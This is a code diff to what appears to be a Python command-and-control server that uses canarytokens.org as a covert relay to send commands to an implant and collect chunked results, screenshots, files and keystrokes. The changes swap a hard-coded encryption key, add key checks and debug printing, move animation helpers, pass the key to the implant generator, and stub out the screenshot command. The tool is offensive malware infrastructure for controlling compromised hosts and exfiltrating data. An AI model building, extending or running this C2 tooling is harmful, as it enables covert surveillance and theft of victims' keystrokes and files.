@@ -53,7 +53,8 @@ encrypted = True
 BLOCK_SIZE = 32
 
 #---------------Change Me---------------#
-key = b'dRgUkXp2s5u8x/A?D(G+KbPeShVmYq3t'
+#-----------b'<32 length key>-----------#
+key = b'badbirdbadbirdbadbirdbadbirdbadb'
 #---------------------------------------#
 
 
@@ -82,10 +83,13 @@ def decrypt(encrypteddata):
 
         except Exception as e:
             print(Fore.RED + "[-] " + Fore.RESET + " Decryption error: " + str(e))
+            print(e)
+            exc_type, exc_obj, exc_tb = sys.exc_info()
+            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
+            print(exc_type, fname, exc_tb.tb_lineno)
             pass
     else:
         return encrypteddata
-
 
 
 def generate_canarytoken():
@@ -140,7 +144,8 @@ def generate_canarytoken():
         global canaryManagementURL
         canaryManagementURL = "https://www.canarytokens.org/history/?token=" + token + "&auth=" + authtoken
         print(Fore.BLUE + "[!]" + Fore.RESET + " Alert Token: " + token)
-        print(Fore.BLUE + "[!]" + Fore.RESET + " Encryption of traffic: " + str(encrypted))
+        print(Fore.BLUE + "[!]" + Fore.RESET + " Traffic Encryption: " + str(encrypted))
+        print(Fore.BLUE + "[!]" + Fore.RESET + " Using key: " + str(key.decode()) + " for encryption")
         print(Fore.BLUE + "[!]" + Fore.RESET + " URL: " + url)
         print(Fore.BLUE + "[!]" + Fore.RESET + " Auth Token: " + authtoken)
         print(Fore.BLUE + "[!]" + Fore.RESET + " UUID For Implant: " + trackingString)
@@ -175,18 +180,6 @@ def taskCommand(cmd):
     else:
         response = requests.get(url, headers=headers)
 
-
-# Animate for chunking
-def chunkAnimate():
-    for c in itertools.cycle([Fore.BLUE + '[|]' + Fore.RESET + ' Rebuilding Output   ',
-                              Fore.BLUE + '[/]' + Fore.RESET + ' Rebuilding Output.  ',
-                              Fore.BLUE + '[-]' + Fore.RESET + ' Rebuilding Output.. ',
-                              Fore.BLUE + '[\\]' + Fore.RESET + ' Rebuilding Output...']):
-        if doneChunked:
-            break
-        sys.stdout.write('\r' + c)
-        sys.stdout.flush()
-        time.sleep(0.25)
 
 
 # Request to get results from command
@@ -252,7 +245,7 @@ def getResults(lastdictsize):
                         print(
                             Fore.BLUE + "\n[!]" + Fore.RESET + " Response too large to send in one request. We'll have to split it up into chunks")
                         print(
-                            Fore.BLUE + "[!]" + Fore.RESET + " Attempting to reassemble from " + command + " chunked requests...\n")
+                            Fore.BLUE + "[!]" + Fore.RESET + " Reassembling from " + command + " chunked requests...\n")
                         showChunkWarning = False
                         tChunk = threading.Thread(target=chunkAnimate)
                         tChunk.daemon = True
@@ -269,8 +262,6 @@ def getResults(lastdictsize):
                         for x in trash:
                             if "useragent" in x.text:
                                 chunkedlist.append(x.find_next_sibling().string.strip())
-
-
 
                         # Loop until we have ALL the chunked data
                         if (len(chunkedlist)) == (len(reslist) + chunkedlen):
@@ -314,7 +305,7 @@ def getResults(lastdictsize):
                     if showChunkWarning:
                         print(Fore.BLUE + "\n[!]" + Fore.RESET + " Screenshot returning in multiple chunks")
                         print(
-                            Fore.BLUE + "[!]" + Fore.RESET + " Attempting to reassemble screenshot from " + command + " chunked requests...\n")
+                            Fore.BLUE + "[!]" + Fore.RESET + " Reassembling from " + command + " chunked requests...\n")
                         showChunkWarning = False
                         tChunk = threading.Thread(target=chunkAnimate)
                         tChunk.daemon = True
@@ -350,6 +341,7 @@ def getResults(lastdictsize):
                     decodedlist.append(stringbuilder)
                     # Need to sleep for large requests
                     time.sleep(1)
+                    #print(decodedlist[-1])
                     doneChunked = True
                     imgbytes = base64.b64decode(decrypt(decodedlist[-1]))
                     timestr = time.strftime("%Y%m%d-%H%M%S")
@@ -377,7 +369,7 @@ def getResults(lastdictsize):
                     if showChunkWarning:
                         print(Fore.BLUE + "\n[!]" + Fore.RESET + " File returning in multiple chunks")
                         print(
-                            Fore.BLUE + "[!]" + Fore.RESET + " Attempting to reassemble file from " + command + " chunked requests...\n")
+                            Fore.BLUE + "[!]" + Fore.RESET + " Reassembling from file from " + command + " chunked requests...\n")
                         showChunkWarning = False
                         tChunk = threading.Thread(target=chunkAnimate)
                         tChunk.daemon = True
@@ -485,18 +477,6 @@ def getResults(lastdictsize):
     return len(reslist) + 1
 
 
-def animateWaitForImplant():
-    for c in itertools.cycle([Fore.BLUE + '[|]' + Fore.RESET + ' Waiting for implant connection   ',
-                              Fore.BLUE + '[/]' + Fore.RESET + ' Waiting for implant connection.  ',
-                              Fore.BLUE + '[-]' + Fore.RESET + ' Waiting for implant connection.. ',
-                              Fore.BLUE + '[\\]' + Fore.RESET + ' Waiting for implant connection...']):
-        if doneWaitForImplant:
-            break
-        sys.stdout.write('\r' + c)
-        sys.stdout.flush()
-        time.sleep(0.25)
-
-
 def wait_for_implant():
     global doneWaitForImplant
     doneWaitForImplant = False
@@ -558,16 +538,6 @@ def implantSleep(time, jitter):
     response = requests.get(url, headers=headers)
 
 
-def animateFetchKeylog():
-    for c in itertools.cycle([Fore.BLUE + '[|]' + Fore.RESET + ' Requesting Keystrokes   ',
-                              Fore.BLUE + '[/]' + Fore.RESET + ' Requesting Keystrokes.  ',
-                              Fore.BLUE + '[-]' + Fore.RESET + ' Requesting Keystrokes.. ',
-                              Fore.BLUE + '[\\]' + Fore.RESET + ' Requesting Keystrokes...']):
-        if waitForKeys:
-            break
-        sys.stdout.write('\r' + c)
-        sys.stdout.flush()
-        time.sleep(0.25)
 
 
 def keystrokes(keychoice):
@@ -705,6 +675,11 @@ def animate():
         sys.stdout.flush()
         time.sleep(0.25)
 
+def checkKey():
+    if len(key.decode()) != 32:
+        print(Fore.RED + "[-]" + Fore.RESET + " Error: Key is not 32 bytes. Please check your key and try again.")
+        sys.exit(1)
+
 
 def main():
     init(convert=True)
@@ -715,8 +690,9 @@ def main():
     if currentOS != "Windows":
         print(
             Fore.RED + "\n[-]" + Fore.RESET + " As of now, must be ran on Windows. Sorry :(... Current OS: " + currentOS + "\n")
-        return
+        sys.exit(1)
 
+    checkKey()
     global lastdictsize
     lastdictsize = 1
     global pwd
@@ -886,12 +862,15 @@ def main():
 
                 elif cmd.lower() == "screenshot":
                     if connected:
+                        print("TOFIX")
+                        """TOFIX
                         print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token for screenshot")
                         fallback()
                         time.sleep(1)
                         print(Fore.BLUE + "[!]" + Fore.RESET + " Sending screenshot command...")
                         taskCommand("saycheese:")
                         lastdictsize = getResults(lastdictsize)
+                        """
                     else:
                         print(
                             Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
@@ -916,7 +895,7 @@ def main():
                             if canaryManagementURL == "":
                                 print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token...")
                                 generate_canarytoken()
-                            lootpath = generateimplant(canaryManagementURL)
+                            lootpath = generateimplant(canaryManagementURL,key)
                             wait_for_implant()
                             continue
                         elif choice == "n" or choice == "no":
@@ -928,7 +907,7 @@ def main():
                         if canaryManagementURL == "":
                             print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token...")
                             generate_canarytoken()
-                        lootpath = generateimplant(canaryManagementURL)
+                        lootpath = generateimplant(canaryManagementURL,key)
                         wait_for_implant()
 
                 elif cmd.lower() == "create-token":
@@ -1043,5 +1022,45 @@ def main():
         pass
 
 
+
+# Animations ############################################################################################################
+def chunkAnimate():
+    for c in itertools.cycle([Fore.BLUE + '[|]' + Fore.RESET + ' Rebuilding Output   ',
+                              Fore.BLUE + '[/]' + Fore.RESET + ' Rebuilding Output.  ',
+                              Fore.BLUE + '[-]' + Fore.RESET + ' Rebuilding Output.. ',
+                              Fore.BLUE + '[\\]' + Fore.RESET + ' Rebuilding Output...']):
+        if doneChunked:
+            break
+        sys.stdout.write('\r' + c)
+        sys.stdout.flush()
+        time.sleep(0.25)
+
+
+def animateWaitForImplant():
+    for c in itertools.cycle([Fore.BLUE + '[|]' + Fore.RESET + ' Waiting for implant connection   ',
+                              Fore.BLUE + '[/]' + Fore.RESET + ' Waiting for implant connection.  ',
+                              Fore.BLUE + '[-]' + Fore.RESET + ' Waiting for implant connection.. ',
+                              Fore.BLUE + '[\\]' + Fore.RESET + ' Waiting for implant connection...']):
+        if doneWaitForImplant:
+            break
+        sys.stdout.write('\r' + c)
+        sys.stdout.flush()
+        time.sleep(0.25)
+
+
+def animateFetchKeylog():
+    for c in itertools.cycle([Fore.BLUE + '[|]' + Fore.RESET + ' Requesting Keystrokes   ',
+                              Fore.BLUE + '[/]' + Fore.RESET + ' Requesting Keystrokes.  ',
+                              Fore.BLUE + '[-]' + Fore.RESET + ' Requesting Keystrokes.. ',
+                              Fore.BLUE + '[\\]' + Fore.RESET + ' Requesting Keystrokes...']):
+        if waitForKeys:
+            break
+        sys.stdout.write('\r' + c)
+        sys.stdout.flush()
+        time.sleep(0.25)
+
+
 if __name__ == '__main__':
     main()
+
+
